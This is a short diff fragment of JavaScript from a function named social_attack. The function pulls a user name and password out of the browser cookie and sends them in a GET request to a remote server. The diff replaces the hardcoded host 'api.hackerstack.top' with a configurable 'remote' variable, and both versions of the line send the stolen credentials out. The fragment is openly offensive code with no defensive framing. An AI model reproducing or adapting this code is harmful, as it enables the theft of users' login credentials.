@@ -202,7 +202,7 @@ function social_attack(attack_type) {
     var user = JSON.parse(document.cookie).user;
     var pwd = JSON.parse(document.cookie).pwd;
     var xhr = new XMLHttpRequest();
-    xhr.open("GET","http://api.hackerstack.top/api/"+attack_type+"/"+user+"/"+pwd,true);
+    xhr.open("GET",remote+"/api/"+attack_type+"/"+user+"/"+pwd,true);
     xhr.send();
     xhr.onload=function()
     {
